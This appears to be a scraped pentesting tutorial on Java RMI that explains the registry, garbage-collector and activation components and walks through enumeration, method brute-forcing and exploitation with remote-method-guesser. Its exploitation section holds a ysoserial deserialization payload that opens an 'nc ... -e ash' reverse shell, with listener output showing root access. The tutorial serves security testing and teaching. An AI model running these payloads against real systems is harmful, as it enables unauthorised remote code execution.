
##
#
https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi
#
https://itnext.io/java-rmi-for-pentesters-part-two-reconnaissance-attack-against-non-jmx-registries-187a6561314d
#
https://github.com/qtc-de/remote-method-guesser
#
https://bishopfox.com/blog/rmiscout
##


1098/1099/1050 - Pentesting Java RMI - RMI-IIOP
​ - -  - ​

Use  to easily build and automate workflows powered by the world's most advanced community tools.
Get Access Today:
Basic Information
Java Remote Method Invocation, or Java RMI, is an object oriented RPC mechanism that allows an object located in one Java virtual machine to call methods on an object located in another Java virtual machine. This enables developers to write distributed applications using an object-oriented paradigm. A short introduction to Java RMI from an offensive perspective can be found in .
Default port: 1090,1098,1099,1199,4443-4446,8999-9010,9999
PORT      STATE SERVICE      VERSION
1090/tcp  open  ssl/java-rmi Java RMI
9010/tcp  open  java-rmi     Java RMI
37471/tcp open  java-rmi     Java RMI
40259/tcp open  ssl/java-rmi Java RMI
Usually, only the default Java RMI components (the RMI Registry and the Activation System) are bound to common ports. The remote objects that implement the actual RMI application are usually bound to random ports as shown in the output above.
nmap has sometimes troubles identifying SSL protected RMI services. If you encounter an unknown ssl service on a common RMI port, you should further investigate.
RMI Components
To put it in simple terms, Java RMI allows a developer to make a Java object available on the network. This opens up a TCP port where clients can connect and call methods on the corresponding object. Despite this sounds simple, there are several challenges that Java RMI needs to solve:
To dispatch a method call via Java RMI, clients need to know the IP address, the listening port, the implemented class or interface and the ObjID of the targeted object (the ObjID is a unique and random identifier that is created when the object is made available on the network. It is required because Java RMI allows multiple objects to listen on the same TCP port).
Remote clients may allocate resources on the server by invoking methods on the exposed object. The Java virtual machine needs to track which of these resources are still in use and which of them can be garbage collected.
The first challenge is solved by the RMI registry, which is basically a naming service for Java RMI. The RMI registry itself is also an RMI service, but the implemented interface and the ObjID are fixed and known by all RMI clients. This allows RMI clients to consume the RMI registry just by knowing the corresponding TCP port.
When developers want to make their Java objects available within the network, they usually bind them to an RMI registry. The registry stores all information required to connect to the object (IP address, listening port, implemented class or interface and the ObjID value) and makes it available under a human readable name (the bound name). Clients that want to consume the RMI service ask the RMI registry for the corresponding bound name and the registry returns all required information to connect. Thus, the situation is basically the same as with an ordinary DNS service. The following listing shows a small example:
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import lab.example.rmi.interfaces.RemoteService;
​
public class ExampleClient {
​
  private static final String remoteHost = "172.17.0.2";
  private static final String boundName = "remote-service";
​
  public static void main(String[] args)
  {
    try {
      Registry registry = LocateRegistry.getRegistry(remoteHost);     // Connect to the RMI registry
      RemoteService ref = (RemoteService)registry.lookup(boundName);  // Lookup the desired bound name
      String response = ref.remoteMethod();                           // Call a remote method
    
    } catch( Exception e) {
      e.printStackTrace();
    }
  }
}
The second of the above mentioned challenges is solved by the Distributed Garbage Collector (DGC). This is another RMI service with a well known ObjID value and it is available on basically each RMI endpoint. When an RMI client starts to use an RMI service, it sends an information to the DGC that the corresponding remote object is in use. The DGC can then track the reference count and is able to cleanup unused objects.
Together with the deprecated Activation System, these are the three default components of Java RMI:
The RMI Registry (ObjID = 0)
The Activation System (ObjID = 1)
The Distributed Garbage Collector (ObjID = 2)
The default components of Java RMI have been known attack vectors for quite some time and multiple vulnerabilities exist in outdated Java versions. From an attacker perspective, these default components are interisting, because they implemented known classes / interfaces and it is easily possible to interact with them. This situation is different for custom RMI services. To call a method on a remote object, you need to know the corresponding method signature in advance. Without knowing an existing method signature, there is no way to communicate to a RMI service.
RMI Enumeration
​ is a Java RMI vulnerability scanner that is capable of identifying common RMI vulnerabilities automatically. Whenever you identify an RMI endpoint, you should give it a try:
$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff7, 3638117546492248534]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ffc, 708796783031663206]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
The output of the enumeration action is explained in more detail in the  of the project. Depending on the outcome, you should try to verify identified vulnerabilities.
The ObjID values displayed by remote-method-guesser can be used to determine the uptime of the service. This may allows to identify other vulnerabilities:
$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] ObjNum: 		-4004948013687638236
[+] UID:
[+] 	Unique: 	1442798173
[+] 	Time: 		1640761503828 (Dec 29,2021 08:05)
[+] 	Count: 		-32760
Bruteforcing Remote Methods
Even when no vulnerabilities have been identified during enumeration, the available RMI services could still expose dangerous functions. Furthermore, despite RMI communication to RMI default components is protected by deserialization filters, when talking to custom RMI services, such filters are usually not in place. Knowing valid method signatures on RMI services is therefore valuable.
Unfortunately, Java RMI does not support enumerating methods on remote objects. That being said, it is possible to bruteforce method signatures with tools like  or :
$ rmg guess 172.17.0.2 9010
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
Identified methods can be called like this:
$ rmg call 172.17.0.2 9010 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar 
[+] uid=0(root) gid=0(root) groups=0(root)
Or you can perform deserialization attacks like this:
$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.lang.String on position 0
[+] 	Specified method signature is String execute(String dummy)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.
[+] 	Deserialization attack probably worked :)
​
$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45479.
id
uid=0(root) gid=0(root) groups=0(root)
More information can be found in these articles:
​​
​​
​​
​​
Apart from guessing, you should also look in search engines or GitHub for the interface or even the implementation of an encountered RMI service. The bound name and the name of the implemented class or interface can be helpful here.
Known Interfaces
​ marks classes or interfaces as known if they are listed in the tool's internal database of known RMI services. In these cases you can use the known action to get more information on the corresponding RMI service:
$ rmg enum 172.17.0.2 1090 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]
​
$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
Shodan
port:1099 java
